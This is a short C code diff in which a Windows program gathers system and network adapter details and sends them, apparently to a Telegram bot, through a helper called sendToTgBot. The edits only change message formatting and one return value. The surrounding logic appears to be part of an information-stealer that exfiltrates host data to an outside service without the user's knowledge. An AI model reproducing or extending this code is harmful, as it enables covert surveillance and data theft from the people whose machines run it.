@@ -62,7 +62,7 @@ int main(int argc, char* argv[]) {
   // test tgbot sending message
   char test[1024];
   const char* message = "meow-meow";
-  snprintf(test, sizeof(test), "{\"text\":\"%s\"}", message);
+  snprintf(test, sizeof(test), "%s", message);
   sendToTgBot(test);
 
   char systemInfo[4096];
@@ -89,7 +89,7 @@ int main(int argc, char* argv[]) {
   DWORD adapterInfoSize = sizeof(adapterInfo);
   if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
     printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
-    return false;
+    return -1;
   }
 
   snprintf(systemInfo, sizeof(systemInfo),
@@ -119,7 +119,7 @@ int main(int argc, char* argv[]) {
   }
   
   char info[8196];
-  snprintf(info, sizeof(info), "{\"text\":\"%s\"}", systemInfo);
+  snprintf(info, sizeof(info), "%s", systemInfo);
   int result = sendToTgBot(info);
 
   if (result == 0) {
